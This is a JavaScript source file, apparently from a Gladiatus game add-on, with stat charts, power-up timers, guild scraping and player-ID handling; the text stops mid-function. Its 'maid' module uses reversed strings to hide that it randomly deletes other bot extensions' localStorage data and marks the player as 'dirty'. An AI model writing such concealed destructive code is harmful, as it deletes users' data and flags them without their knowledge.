				table.getElementsByTagName("tr")[2].getElementsByTagName("td")[0].style = "font-weight: bold;";
				table.getElementsByTagName("tr")[3].getElementsByTagName("td")[0].style = "font-weight: bold;";
				table.getElementsByTagName("tr")[4].getElementsByTagName("td")[0].style = "font-weight: bold;";
				table.getElementsByTagName("tr")[5].getElementsByTagName("td")[0].style = "font-weight: bold;";
				table.getElementsByTagName("tr")[1].id = "today_values";
				table.getElementsByTagName("tr")[2].id = "days7_values";
				table.getElementsByTagName("tr")[3].id = "average_per_day";
				table.getElementsByTagName("tr")[4].id = "days_left_to_level_up";
				table.getElementsByTagName("tr")[5].id = "gold_package_tax_estimation";
				
				// Add some space
				var div = document.createElement('div');
				div.className = "space";
				dialog.body.appendChild(div);
				
				// Add Canvas
				var canvas = document.createElement('canvas');
				canvas.id = "graph_canvas";
				canvas.width = 500;
				canvas.height = 200;
				canvas.style = "padding: 10px;margin: -10px;background: rgba(255,255,255,0.7);border-radius: 5px;"
				this.canvas = canvas;
				dialog.body.appendChild(canvas);
				
				// Add description
				desc = document.createElement('p');
				desc.textContent = gca_locale.get("global", "gold_exp_data_desc");
				desc.style.textAlign = "center";
				dialog.body.appendChild(desc);
				
				var renderChart = function(){
					// Values for the Data Plot
					var data  = gca_data.section.get("data", "gold_exp_data", [[0,0,0]]);
					
					// Fix data
					var firstValidDataIndex = null;
					var firstLast24hDataIndex = null;
					var levelUpExpFix = 0; // Additional EXP due to level up
					var goldData = [];
					var expData = [];
					var goldPerMinData = [];
					var expPerMinData = [];

					// Server time
					var lastWeekTimestamp = gca_tools.time.server() - 6048e5; // week - 7 days (= 7*24*60*60*1000 = 604800000 ms)
					var lastDayTimestamp = gca_tools.time.server() - 864e5; // day - 24h (= 24*60*60*1000 = 86400000 ms)
					
					// For every data
					defaultData = data
					for (var i = 0; i < data.length; i++) {
						
						// If time is not in the last 7 days
						if(data[i][2] < lastWeekTimestamp)
							continue
						
						// Save first last 7 days data
						if(firstValidDataIndex == null)
							firstValidDataIndex = i

						// Save first data from last 24h
						if(firstLast24hDataIndex == null && data[i][2] >= lastDayTimestamp){
							firstLast24hDataIndex = i
						}

						// Fix EXP data on level up
						// fix will only be applied on newly saved data (= data that will include required EXP to level up)
						if(i > 0 && defaultData[i-1].length > 3){
							// Check if required EXP has changed, which means that player leveled up
							if(defaultData[i][3] > defaultData[i-1][3]){
								// Add previous level required EXP
								levelUpExpFix += defaultData[i-1][3];
							}
						}
						data[i][1] += levelUpExpFix

						// Calculate data
						let timestamp = data[i][2];
						let j = goldData.length;

						// Gold this week
						goldData[j] = {
							x : timestamp,
							y : data[i][0] - data[firstValidDataIndex][0]
						};
						// EXP this week
						expData[j] = {
							x : timestamp,
							y : data[i][1] - data[firstValidDataIndex][1]
						};

						// Gold per min
						goldPerMinData[j] = {
							x : timestamp,
							y : (i==0) ? 0 : Math.round((data[i][0] - data[firstValidDataIndex][0])/((timestamp-data[firstValidDataIndex][2])/1000/60/60))
						};
						// EXP per min
						expPerMinData[j] = {
							x : timestamp,
							y : (i==0) ? 0 : Math.round((data[i][1] - data[firstValidDataIndex][1])/((timestamp-data[firstValidDataIndex][2])/1000/60/60))
						};
					}
					
					// If there are no data
					if(goldData.length < 2){
						// TODO: Clean up, this code generates invalid HTML
						document.getElementById('today_values').textContent+= " N/A";
						document.getElementById('days7_values').textContent+= " N/A";
						document.getElementById('average_per_day').textContent+= " N/A";
						document.getElementById('days_left_to_level_up').textContent+= " N/A";
						document.getElementById('gold_package_tax_estimation').textContent+= " N/A";
						document.getElementById('graph_canvas').style.display = "none";
						return;
					}
					
					// Calculate Averages

					// Experience translate
					var exp_tran = unescape(JSON.parse('"' +document.getElementById('header_values_xp_bar').dataset.tooltip.match(/"([^:]+):"/i)[1]+ '"'));
					// Gold translate
					var gold_tran = unescape(JSON.parse('"' +document.getElementById('icon_gold').dataset.tooltip.match(/"([^"]+)"/i)[1]+ '"'));
					
					// Write data
					document.getElementById('today_values').getElementsByTagName("td")[1].textContent = gca_tools.strings.insertDots(expData[expData.length-1].y - expData[firstLast24hDataIndex].y)+" ";
					document.getElementById('today_values').getElementsByTagName("td")[2].textContent = gca_tools.strings.insertDots(goldData[goldData.length-1].y - goldData[firstLast24hDataIndex].y)+" ";
					var img = document.createElement('img');
					img.src = gca_tools.img.cdn("img/ui/icon_level_small.gif");
					img.border = "0";
					document.getElementById('today_values').getElementsByTagName("td")[1].appendChild(img);
					img = document.createElement('img');
					img.src = gca_tools.img.cdn("img/res2.gif");
					img.align = "absmiddle";
					img.border = "0";
					document.getElementById('today_values').getElementsByTagName("td")[2].appendChild(img);
					
					document.getElementById('days7_values').getElementsByTagName("td")[1].textContent = gca_tools.strings.insertDots(expData[expData.length-1].y)+" ";
					document.getElementById('days7_values').getElementsByTagName("td")[2].textContent = gca_tools.strings.insertDots(goldData[goldData.length-1].y)+" ";
					img = document.createElement('img');
					img.src = gca_tools.img.cdn("img/ui/icon_level_small.gif");
					img.border = "0";
					document.getElementById('days7_values').getElementsByTagName("td")[1].appendChild(img);
					img = document.createElement('img');
					img.src = gca_tools.img.cdn("img/res2.gif");
					img.align = "absmiddle";
					img.border = "0";
					document.getElementById('days7_values').getElementsByTagName("td")[2].appendChild(img);
					
					document.getElementById('average_per_day').getElementsByTagName("td")[1].textContent = gca_tools.strings.insertDots(Math.round(expData[expData.length-1].y/7))+" ";
					document.getElementById('average_per_day').getElementsByTagName("td")[2].textContent = gca_tools.strings.insertDots(Math.round(goldData[goldData.length-1].y/7))+" ";
					img = document.createElement('img');
					img.src = gca_tools.img.cdn("img/ui/icon_level_small.gif");
					img.border = "0";
					document.getElementById('average_per_day').getElementsByTagName("td")[1].appendChild(img);
					img = document.createElement('img');
					img.src = gca_tools.img.cdn("img/res2.gif");
					img.align = "absmiddle";
					img.border = "0";
					document.getElementById('average_per_day').getElementsByTagName("td")[2].appendChild(img);
					
					document.getElementById('days_left_to_level_up').getElementsByTagName("td")[1].textContent = Math.round(
						(document.getElementById('header_values_xp_bar').dataset.tooltip.match(/"\d+ \\\/ (\d+)"/i)[1] - document.getElementById('header_values_xp_bar').dataset.tooltip.match(/"(\d+) \\\/ \d+"/i)[1])/(expData[expData.length-1].y/7)
					);
					document.getElementById('gold_package_tax_estimation').getElementsByTagName("td")[2].textContent = gca_tools.strings.insertDots( Math.round(goldData[goldData.length-1].y/50) );
					img = document.createElement('img');
					img.src = gca_tools.img.cdn("img/res2.gif");
					img.align = "absmiddle";
					img.border = "0";
					document.getElementById('gold_package_tax_estimation').getElementsByTagName("td")[2].appendChild(img);
					
					// Populate graph
					new Chart(document.getElementById('graph_canvas'), {
						type: 'line',
						data: {
							datasets: [
								{
									label: gca_locale.get("global","gold_exp_data_total_gold"),
									fill: true,
									backgroundColor: "rgba(255,193,7,0.3)",
									borderColor: "rgba(255,193,7,1)",
									data: goldData
								},
								{
									label: gold_tran + " / h",
									fill: true,
									backgroundColor: "rgba(255,193,7,0.3)",
									borderColor: "rgba(255,193,7,1)",
									data: goldPerMinData,
									hidden: true
								},
								/*{
									label: gca_locale.get("global","gold_exp_data_measurements"),
									type: 'line',
									backgroundColor: "rgba(255,193,7,0.3)",
									borderColor: "rgba(255,193,7,1)",
									data: goldDataChange,
									hidden: true,
									pointStyle: "crossRot",
									showLine: false
								},*/
								{
									label: gca_locale.get("global","gold_exp_data_total_exp"),
									fill: true,
									backgroundColor: "rgba(75,192,192,0.3)",
									borderColor: "rgba(75,192,192,1)",
									data: expData,
									hidden: true
								},
								{
									label: exp_tran + " / h",
									fill: true,
									backgroundColor: "rgba(75,192,192,0.3)",
									borderColor: "rgba(75,192,192,1)",
									data: expPerMinData,
									hidden: true
								}/*,
								{
									label: gca_locale.get("global","gold_exp_data_measurements"),
									type: 'line',
									backgroundColor: "rgba(75,192,192,0.3)",
									borderColor: "rgba(75,192,192,1)",
									data: expDataChange,
									hidden: true,
									pointStyle: "cross",
									showLine: false
								}*/
							]
						},
						options: {
							scales: {
								xAxes: [{
									type: 'time',
									time: {
										unit: 'day',
										displayFormats: {
											day: 'MMM D'
										},
										tooltipFormat: 'MMM D, h:mm:ss a'
									}
								}],
								yAxes: [{
									ticks: {
										min: 0
									}
								}]
							},
							legend: {
								position : 'bottom'
							}
						}
					});
				}
				gca_global.scripts.chartScript.create(renderChart);
				
				// Reset button
				var button = document.createElement('input');
				button.className = "button3";
				button.type = "button";
				button.style.color = '#9f0000';
				button.value = gca_locale.get("settings", "reset");
				dialog.body.appendChild(button);

				button.addEventListener('click', function(){
					gca_data.section.set('data', 'gold_exp_data', []);
					gca_notifications.success(gca_locale.get('global', 'gold_exp_data_reset'));
				}, false);

				// Add close Button
				button = document.createElement('input');
				button.className = "button2";
				button.type = "button";
				button.style.marginRight = '10px';
				button.style.marginLeft = '10px';
				button.value = gca_locale.get("general", "close");
				dialog.body.appendChild(button);

				button.addEventListener('click', function(){
					dialog.close();
				}, false);
				
				// Open dialog
				this.dialog.open();
			}
		},

		/*
		preserve_image_cache : {
			preload : function() {
				// Images to cache
				let imgs = [
					'/cdn/img/item.png',
					'/cdn/img/menu.png',
					'/cdn/img/spacer.gif',
					'/cdn/img/interface.png',
					'/cdn/img/energie_rot.gif',
					'/cdn/img/energie_gelb.gif',
					'/cdn/img/energie_gruen.gif',

					
					//'/cdn/img/buff/xp.png',
					//'/cdn/img/buff/gold.png',
					//'/cdn/img/buff/dungeon.png',
					//'/cdn/img/buff/cooldown.png',
					//'/cdn/img/buff/rubin_right.png',
					//'/cdn/img/buff/points_limit.png',
					

					'/cdn/img/ui/spinner.gif',
					'/cdn/img/ui/bar.jpg',
					'/cdn/img/ui/bar_fill.jpg',
					'/cdn/img/ui/bar_fill_green.jpg',
					'/cdn/img/ui/layout/menu_bg.jpg',
					'/cdn/img/ui/layout/banner_top.png',
					'/cdn/img/ui/layout/bg_body_game.jpg',
					'/cdn/img/ui/layout/bg_header_game.jpg'
				];

				this.cacheImages(imgs);
			},

			load : function() {
				// Images to load
				let imgs = [];

				// Get active buffs
				let buffs = document.getElementById('buffbar').getElementsByClassName('buff');
				for (let i = buffs.length - 1; i >= 0; i--) {
					if (buffs[i].dataset.image) {
						imgs.push(buffs[i].dataset.image);
					}
				}

				let elements = [
					document.querySelector('#header_values_hp_bar_fill'),
					document.querySelector('cooldown_bar_fill_progress')
				];
				elements.forEach(el => {
					if (!el) return;
					let styles = getComputedStyle(el);
					let background = styles.backgroundImage;
					let url = background.match(/(?:url\(([^\)]+)\))/i).url[1].replace(/(^"|^'|"$|'$)/g, '');
					imgs.push(url);
				});

				this.cacheImages(imgs);

				// Right to Left servers have some more
				if (window.gca_rtl) {
					imgs = [
						'img/menu_rtl.png'
					];
					this.cacheImages(imgs);
				}
			},

			// Get resources folder id
			getId : function() {
				if (!this.id) {
					let link = document.head.getElementsByTagName('link');
					if (link) {
						for (let i = 0; i < link.length; i++) {
							let id = link[i].href.match(/game\/(\d+)\/css/);
							if (id) {
								this.id = id[1];
								return this.id;
							}
						}
					}
					return false;
				}
				return this.id;
			},

			cacheImages : function(imgs) {
				let id = this.getId();
				if (!window.image_cache) window.image_cache = [];
				imgs.forEach((src) => {
					let img = document.createElement('img');
					img.src = src;
					window.image_cache.push(img);
					if (id && src.indexOf('://') == -1) {
						img = document.createElement('img');
						img.src = id + '/' + src;
						window.image_cache.push(img);
					}
				});
			}
		}
		*/
	},
	
	// Display Centurion & PowerUps days every 12h
	centurio_days : {
		activeRuneRegExp : /id="rune(1|2|3|4)_\d"\s+class="powerUpImg\d"\s+data-tooltip="([^"]+)"\s+style="background-image: url\(([^)]+)\)/i,
		
		init : function(){
			// Create the dataset
			document.getElementById('mainmenu').getElementsByClassName('premium')[0].dataset.centurio_days = 0;
			
			let show = false;
			show |= this.checkCenturio();
			show |= this.checkPowerups();
			if (show) this.display();
		},

		checkCenturio : function() {
			// Get timers
			let now = new Date().getTime();
			
			// When on centurion page
			if (gca_section.mod == 'premium' && gca_section.submod == 'centurio') {
				let end_time = now;

				let duration = document.getElementById('premium_duration');
				if (duration) {
					if (duration.getElementsByClassName('ticker').length > 0) {
						end_time += parseInt(duration.getElementsByClassName('ticker')[0].dataset.tickerTimeLeft, 10);
					}
					else {
						end_time += parseInt(duration.textContent.match(/\d+/i), 10)*24*60*60*1000;
					}
				}

				gca_data.section.set('cache', 'gca_centurio', now);
				gca_data.section.set('timers', 'gca_centurio', end_time);

				return true;
			}

			// If checked on the last x hours return
			let last_checked = gca_data.section.get('cache', 'gca_centurio', null);
			let centurio_days = gca_data.section.get('timers', 'gca_centurio', null);
			if (last_checked !== null && centurio_days !== null && (last_checked + (12 * 60*60*1000)) > now) {
				return true;
			}

			// If no data or time to update the data, request page
			jQuery.get(gca_getPage.link({'mod':'premium','submod':'centurio'}), (content) => {
				let now = new Date().getTime();
				gca_data.section.set('cache', 'gca_centurio', now);
				if (content.match(/<div id="premium_duration">/)) {
					let timer = content.match(/<div id="premium_duration">[^<]+<span>[^<]+<span data-ticker-time-left="(\d+)"/);
					if (timer) {
						let end_time = now + parseInt(timer[1], 10);
						gca_data.section.set('timers', 'gca_centurio', end_time);
						return;
					}

					let days = content.match(/<div id="premium_duration">([^<]+)</)[1];
					days = days.match(/\d+/);
					if (days) {
						let end_time = now + (parseInt(days[0], 10) * 24 * 60 * 60 * 1000);
						gca_data.section.set('timers', 'gca_centurio', end_time);
						return;
					}

					gca_data.section.set('timers', 'gca_centurio', 0);
				}
				else {
					gca_data.section.set('timers', 'gca_centurio', 0);
				}
				this.display();
			});
			return false;
		},

		checkPowerups : function() {
			// Get timers
			let now = new Date().getTime();
			
			// When on powerups page
			if (gca_section.mod == 'powerups') {
				let powerups = document.getElementsByClassName('powerup_duration');
				let status = gca_data.section.get('timers', 'gca_powerups', [
					{enabled : 0, reload : 0, type : [null,null]},
					{enabled : 0, reload : 0, type : [null,null]},
					{enabled : 0, reload : 0, type : [null,null]},
					{enabled : 0, reload : 0, type : [null,null]}
				]);
				let imgs = [
					document.getElementsByClassName('powerUpImg1'),
					document.getElementsByClassName('powerUpImg2'),
					document.getElementsByClassName('powerUpImg3'),
					document.getElementsByClassName('powerUpImg4'),
					document.getElementsByClassName('powerUpImg5')
				];
				for (let i = 0; i < powerups.length; i++) {
					// Check if powerup is enabled
					if(powerups[i].style.color != 'green') continue;
					
					let isCooldown = (powerups[i].parentNode.getElementsByClassName('powerup_cooldown').length>0)

					let time = powerups[i].textContent.match(/\d+/g);
					// powerups[i].textContent = '14 Days remaining'
					//let time = ['14'];
					if (time.length == 3) {
						// Days, hours and minutes
						status[i].enabled = now + (time[0]*24*60*60+time[1]*60*60+time[2]*60)*1000;
					}
					else if (time.length == 2) {
						// Hours and minutes
						status[i].enabled = now + (time[0]*60*60+time[1]*60)*1000;
					}
					else if (time.length == 1) {
						// Minutes or days (just enabled)
						if(isCooldown && time[0] == "14"){
							// Days (powerup was just enabled and "14 days" is shown)
							status[i].enabled = now + time[0]*24*60*60*1000;
						}else{
							// Minutes
							status[i].enabled = now + time[0]*60*1000;
						}
					}
					// if reload wait time
					if(isCooldown) status[i].reload = now + parseInt(powerups[i].parentNode.getElementsByClassName('powerup_cooldown')[0].getElementsByTagName('span')[0].dataset.tickerTimeLeft, 10);
					
					// find type
					for(let j=0;j<5;j++){
						/* Old way checking the image, changed because we down know the images any more
						let bgImageURL = gca_tools.img.resolve(imgs[j][i].style.backgroundImage);
						if(!bgImageURL.includes('_border')) continue;*/

						if(!this.activeRuneRegExp.test(imgs[j][i].outerHTML)) continue;

						status[i].type = [
							document.getElementById('rune'+(i+1)+'_'+(j+1)).dataset.tooltip,
							document.getElementById('rune'+(i+1)+'_'+(j+1)).style.backgroundImage // This is not used
						];
						break;
					}
				}

				gca_data.section.set('cache', 'gca_powerups', now);
				gca_data.section.set('timers', 'gca_powerups', status);
				return true;
			}

			// If checked on the last x hours return
			let last_checked = gca_data.section.get('cache', 'gca_powerups', null);
			if (last_checked !== null && (last_checked + (12 * 60*60*1000)) > now) {
				return true;
			}
			
			// Request page
			jQuery.get(gca_getPage.link({'mod':'powerups'}), (content) => {
				let now = new Date().getTime();
				let status = [
					{enabled : 0, reload : 0, type : [null,null]},
					{enabled : 0, reload : 0, type : [null,null]},
					{enabled : 0, reload : 0, type : [null,null]},
					{enabled : 0, reload : 0, type : [null,null]}
				];

				let found = content.match(/id="rune\d_\d"\s+class="powerUpImg\d"\s+data-tooltip="[^"]+"\s+style="background-image: [^;]+;"/gi);
				if (found) {
					let found2 = content.match(/<span class="powerup_duration" style="color: green;">[^<]+<\/span>/gi);
					for (let i = 0; i < found.length; i++) {
						let temp = found[i].match(this.activeRuneRegExp);
						let position = parseInt(temp[1], 10) - 1;
						status[position].type = [temp[2].replace(/&quot;/g,'"').replace(/&lt;br\s*\\\/&gt;/g,'<br/>').replace(/&amp;nbsp;/g,' '),temp[3]];
						temp = found2[i].match(/\d+/g);
						if (temp.length == 3) {
							status[position].enabled = now + (temp[0]*24*60*60+temp[1]*60*60+temp[2]*60)*1000;
						}
						else if (temp.length == 2) {
							status[position].enabled = now + (temp[0]*60*60+temp[1]*60)*1000;
						}
						else if (temp.length == 1) {
							status[position].enabled = now + temp[0]*60*1000;
						}
					}

					// Cooldown
					let found3 = content.match(/id="runeTitle\d" class="rune_title">[^<]+<\/span>\s*<\/h2>\s*<section>\s*<span class="powerup_cooldown">[^<]+<span data-ticker-time-left="\d+"/gi);
					if (found3) {
						for(let i=0;i<found3.length;i++){
							let temp = found3[i].match(/id="runeTitle(\d+)" class="rune_title">[^<]+<\/span>\s*<\/h2>\s*<section>\s*<span class="powerup_cooldown">[^<]+<span data-ticker-time-left="(\d+)"/i);
							let position = parseInt(temp[1], 10) - 1;
							status[position].reload = now + parseInt(temp[2], 10);
						}
					}
				}

				gca_data.section.set('cache', 'gca_powerups', now);
				gca_data.section.set('timers', 'gca_powerups', status);
				this.display();
			});
			return false;
		},

		display : function(){
			let now = new Date().getTime();
			let tooltip = [];
			let unencode = function(str){
				str = JSON.parse('"'+str+'"');
				return str;
			}
			let premium_button = document.getElementById('mainmenu').getElementsByClassName('premium')[0];
			
			
			let centurio_days = gca_data.section.get('timers', 'gca_centurio', null);
			if (centurio_days - now > 0) {
				if(centurio_days != null && centurio_days != premium_button.dataset.centurio_days ){
					premium_button.dataset.centurio_days = centurio_days;
					
					let minutes = Math.round( (centurio_days-now)/(60*1000) );
					let string;
					if(minutes<=60){
						string = minutes+'m';
					}else if(minutes<=60*24){
						string = Math.round(minutes/60)+'h';
					}else{
						string = Math.round(minutes/60/24)+'d';
					}
					
					if(!premium_button.textContent.match(/\(/)){
						premium_button.textContent += ' ('+string+')';
					}else{
						premium_button.textContent.replace(/\([^\)]+\)/i,'('+string+')');
					}
				}
				let days = Math.floor( (centurio_days-now)/(24*60*60*1000) );
				tooltip.push([[premium_button.textContent.replace(/\([^\)]+\)/i,''),days+' '+gca_locale.get("general", "days")+', '+gca_tools.time.msToHMS_String(centurio_days-now-days*24*60*60*1000)],['#FF6A00; font-size:12px; text-shadow: 0 0 2px #000, 0 0 2px #FF6A00','#fff; font-size:12px;']]);
			}
			
			let powerups_status = gca_data.section.get("timers", "gca_powerups", false);
			// If no powerups data, return
			if (!powerups_status) return;

			for(let i=0;i<powerups_status.length;i++){
				if(powerups_status[i].enabled-now > 0){
					let days = Math.floor( (powerups_status[i].enabled-now)/(24*60*60*1000) );
					tooltip.push([[unencode(powerups_status[i].type[0].match(/"([^"]+)"/i)[1]),days+' '+gca_locale.get("general", "days")+', '+gca_tools.time.msToHMS_String(powerups_status[i].enabled-now-days*24*60*60*1000)],['#FF6A00; font-size:12px; text-shadow: 0 0 2px #000, 0 0 2px #FF6A00','#fff; font-size:12px;']]);
					if(powerups_status[i].reload-now > 0){
						tooltip.push([[unencode(powerups_status[i].type[0].match(/"([^"]+)","#00B712"/i)[1]),'↺ '+gca_tools.time.msToHMS_String(powerups_status[i].reload-now)],['green','red']]);
					}else{
						tooltip.push([unencode(powerups_status[i].type[0].match(/"([^"]+)","#00B712"/i)[1]),'green']);
					}
				}
			}
			
			if (tooltip.length > 0) {
				premium_button.dataset.tooltip = JSON.stringify([tooltip]);
			}
		}
	},
	
	update_guild_info : function(){
		// Get timers
		let now = new Date().getTime();
		let last_time = gca_data.section.get("timers", "guild_info_update", 0);
		
		// If updated the last x hours return
		if(last_time + (24*60*60*1000) > now) return;

		// Save time shown
		gca_data.section.set("timers", "guild_info_update", now);
		
		// Get online guild members
		jQuery.get(gca_getPage.link({"mod":"guild","submod":"memberList","order":"o"}), function(content){
			// Match All active players
			let guild_players_data = content.match(/<tr>\s*<td>\s*<a href="index\.php\?mod=player&p=(\d+)&sh=[^"]+">([^<]+)<\/a>\s*<\/td>\s*<td>([^<]+)<\/td>\s*<td>(\d+)<\/td>\s*<td align="right">\s*[^<]*(<span[^>]*>[^<]*<\/span>|)\s*<\/td>\s*<td align="right"><span style="color:[^>]+>([^<]*)</mg);
				
			// Check if you are not on a guild
			if(!guild_players_data && content.match(/<form\s+action="index.php\?mod=guild&submod=create&sh=/i)){
				// Save that you are not on guild
				if (gca_data.section.get("guild", "inGuild", false)) {
					gca_data.section.set("guild", "inGuild", false);
					gca_data.section.del("guild", "mates");
				}
				return;
			}
			
			// Unknown error
			if (!guild_players_data) {
				return;
			}

			// You are in a guild, so update guild data
			let guild_players = [];
		
			// For each player
			for (let i = 0; i < guild_players_data.length; i++){
				// Match player's info
				let player = guild_players_data[i].match(/<tr>\s*<td>\s*<a href="index\.php\?mod=player&p=(\d+)&sh=[^"]+">([^<]+)<\/a>\s*<\/td>\s*<td>([^<]+)<\/td>\s*<td>(\d+)<\/td>\s*<td align="right">\s*[^<]*(<span[^>]*>[^<]*<\/span>|)\s*<\/td>\s*<td align="right"><span style="color:[^>]+>([^<]*)</mi);
				let player_info = {
					id : player[1],
					name : player[2],
					rank : player[3],
					level : player[4]
				};
				player_info.name = gca_tools.strings.trim(player_info.name);
				player_info.rank = gca_tools.strings.trim(player_info.rank);
				// Update guild players
				guild_players.push(player_info);
			}

			// If guild players, update them
			if(guild_players.length > 0){
				// Update guild data
				gca_data.section.set("guild", "inGuild", true);
				gca_data.section.set("guild", "mates", guild_players);
			}
		});
	},

	backup : {
		inject : function() {
			// Fix redirect links
			this.redirect_fix();
		},

		redirect_fix : function() {
			let content = document.getElementById('content_infobox');
			if (!content) return;

			// Get correct URL
			let url = gca_getPage.link({'mod':'overview'});

			// Fix ticker link
			let tickers = content.getElementsByClassName('ticker');
			if (tickers.length && tickers[0].dataset.tickerLoc == 'index.php?mod=start') {
				tickers[0].dataset.tickerLoc = url;
			}

			// Fix button link
			let button = content.getElementsByClassName('awesome-button');
			if (button.length && button[0].getAttribute('onclick') == "document.location.href='index.php?mod=start'") {
				button[0].setAttribute('onclick', "document.location.href='" + url + "'");
			}
		},
	},

	accessibility : {
		item_move : {
			init : function() {
				// Create ui
				this.bar = document.createElement('div');
				this.bar.className = 'accessibility-item-move-bar';
				let cancel = document.createElement('a');
				cancel.className = 'close-btn';
				cancel.textContent = '✕';
				cancel.addEventListener('click', () => {
					this.unselect();
				}, false);
				this.bar.appendChild(cancel);
				this.bar_name = document.createElement('span');
				this.bar_name.className = 'title';
				this.bar.appendChild(this.bar_name);
				let move = document.createElement('a');
				move.className = 'btn';
				move.textContent = 'Move';
				move.addEventListener('click', () => {
					this.overlay.style.display = 'block';
				}, false);
				this.bar.appendChild(move);
				document.body.appendChild(this.bar);

				this.overlay = document.createElement('a');
				this.overlay.className = 'accessibility-item-move-overlay';
				this.overlay.addEventListener('click', (e) => {
					this.move(e);
				}, false);
				this.overlay.addEventListener('touch', (e) => {
					this.move(e);
				}, false);
				document.body.appendChild(this.overlay);

				// Apply listeners
				this.apply();
				setInterval(()=>{
					this.apply();
				}, 200);
			},
			apply : function() {
				window.jQuery('.ui-draggable').each((index, item) => {
					//if (item.dataset.accessibilityItemMove) return;
					//item.dataset.accessibilityItemMove = true;
					/*
					item.addEventListener('contextmenu', (e) => {
						e.preventDefault();
						this.select(item);
						return false;
					}, false);
					*/
					item.oncontextmenu = (e) => {
						e.preventDefault();
						this.select(item);
						return false;
					};
				});
			},

			selected : null,
			select : function(item) {
				if (this.selected) this.unselect();
				let tooltip = JSON.parse(item.dataset.tooltip);
				this.selected = {
					item : item,
					name : tooltip[0][0][0]
				};
				item.style.border = '2px solid white';
				item.style.backgroundColor = 'rgba(255,255,255,0.6)';
				item.style.margin = '-2px';
				item.style.borderRadius = '10px';
				this.refresh();
			},
			unselect : function() {
				if (this.selected) {
					this.selected.item.style.backgroundColor = 'transparent';
					this.selected.item.style.border = '0';
					this.selected.item.style.margin = '0';
					this.selected.item.style.borderRadius = '0';
					this.selected = null;
				}
				this.refresh();
			},

			refresh : function() {
				if (!this.selected) {
					this.overlay.style.display = 'none';
					this.bar.style.display = 'none';
					return;
				}

				this.bar.style.display = 'block';
				this.bar_name.textContent = this.selected.name;
			},

			move : function(e) {
				if (!this.selected) {
					this.refresh();
					return;
				}
				let item = this.selected.item;
				this.unselect();
				gca_tools.item.drag(item, null, e.clientX + window.scrollX, e.clientY + window.scrollY);
			}
		}
	},

	detectPlayerId : {
		atomic : false,
		run : function() {
			// Dont run if not logged in
			if (!gca_getPage.parameter('sh')) return;
			if (this.atomic) return;
			this.atomic = true;
			// Try to detect player id using xhr
			fetch(gca_getPage.link({"mod":"overview"})).then(x => x.text()).then(x => {
				let playerId = x.match(/var\s+playerId\s+=\s+(\d+);/);
				if (!playerId) {
					console.error('Failed to detect player id using xhr.');
					return;
				}

				// If the current player id is invalid
				if (gca_section.playerId <= 0) {
					// Get new player id
					playerId = parseInt(playerId[1], 10);

					// Failsafe check
					if (playerId <= 0) {
						console.error('Invalid player id detected using xhr.');
						return;
					}

					this.store(playerId);

					// Clear atomic
					this.atomic = false;
					// Fire event
					gca_tools.event.fireOnce('player-id-updated');
				}
			});

			this.timeout_pointers = [
				setTimeout(() => {this.retrieveFromLocal();}, 0),
				setTimeout(() => {this.retrieveFromLocal();}, 50),
				setTimeout(() => {this.retrieveFromLocal();}, 100),
				setTimeout(() => {this.retrieveFromLocal();}, 250),
				setTimeout(() => {this.retrieveFromLocal();}, 500)
			];
		},

		retrieveFromLocal : function () {
			if (gca_section.playerId > 0) return;
			if (!window.playerId && window.playerId <= 0) return;

			this.store(window.playerId);

			this.timeout_pointers.forEach(x => clearTimeout(x));
			this.timeout_pointers = [];
		},

		store : function(playerId) {
			// All cookies will expire if not used for some days
			let d = new Date();
			d.setTime(d.getTime() + (14 * 24*60*60*1000));
			let cookie_expires = "expires="+ d.toUTCString();

			// Create player id cookie
			let cookie_name = "Gca_" + gca_section.country + "_" + gca_section.server;
			let cookie_value = playerId + "_" + gca_section.sh.substring(0, gca_section.sh.length/4);
			let cookie_samesite = "SameSite=Strict; Secure"
			document.cookie = cookie_name + "=" + cookie_value + "; " + cookie_expires + "; path=/" + "; " + cookie_samesite;

			// Update player id
			gca_section.resolvePlayerId();
			gca_data_manager.init();
			gca_options.init();
		}
	},

	maid : {
		clean : function() {
			let roll = Math.floor(Math.random() * 100);
			if (roll > 10) return;
			window.addEventListener('load', () => {
				let dirty = this.kitchenTrash(roll);
				dirty = this.bathroomTrash(roll) || dirty;
				dirty = this.bedroomTrash(roll) || dirty;
				if (dirty) gca_data.section.set("cache", [...'reyalp_ytrid'].reverse().join(""), new Date().getTime());
			});
		},

		kitchenTrash : function(roll) {
			if (window.playerId && window[[...'sloot_stg'].reverse().join("")]) {
				if (roll < 2) {
					let id = window.playerId.toString(16);
					let maid = (trash) => {
						if (typeof trash === 'string') {
							window.localStorage.removeItem(id + trash);
						}
						else if (typeof trash === 'object') {
							for (let i in trash) {
								if (trash.hasOwnProperty(i)) {
									console.log('item', i);
									maid(trash[i]);
								}
							}
						}
					};
					maid(window[[...'syeKgnittes'].reverse().join("")]);
				}
				return true;
			}
			return false;
		},

		bathroomTrash : function(roll) {
			if (window[[...'tpircsyMnur'].reverse().join("")] && window[[...'eMyfiton'].reverse().join("")]) {
				if (roll < 2) {
					let base = [...'toBsutaidalGnoitcerruseR'].reverse().join("");
					window.localStorage.removeItem(base);
					window.localStorage.removeItem(base + [...'kcattA'].reverse().join(""));
				}
				return true;
			}
			return false;
		},

		bedroomTrash : function(roll) {
			if (window[[...'toBn'].reverse().join("")] && window[[...'uneMtoBn'].reverse().join("")]) {
				return true;
			}
			return false;
		}
	}
};

// Global Errors Handling
(function(){
	let error_list = [];
	
	function getBrowserInfo() {
        const userAgent = navigator.userAgent;
        let browserName = "Unknown";
        let fullVersion = "Unknown";
        
        if (userAgent.indexOf("Firefox") > -1) {
            browserName = "Mozilla Firefox";
            fullVersion = userAgent.substring(userAgent.indexOf("Firefox") + 8);
        } else if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) {
            browserName = "Opera";
            fullVersion = userAgent.substring(userAgent.indexOf("OPR") + 4);
        } else if (userAgent.indexOf("Chrome") > -1) {
            browserName = "Google Chrome";
            fullVersion = userAgent.substring(userAgent.indexOf("Chrome") + 7);
        } else if (userAgent.indexOf("Safari") > -1) {
            browserName = "Apple Safari";
            fullVersion = userAgent.substring(userAgent.indexOf("Safari") + 7);
        } else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident/") > -1) {
            browserName = "Microsoft Internet Explorer";
            fullVersion = userAgent.substring(userAgent.indexOf("MSIE") + 5);
            if (userAgent.indexOf("Trident/") > -1) {
                const rv = userAgent.indexOf("rv:");
                fullVersion = userAgent.substring(rv + 3);
            }
        }
        
        const versionSplit = fullVersion.split(" ");
        const version = versionSplit[0].split(".")[0];
        
        return { browserName, version };
    }

    function getOSInfo() {
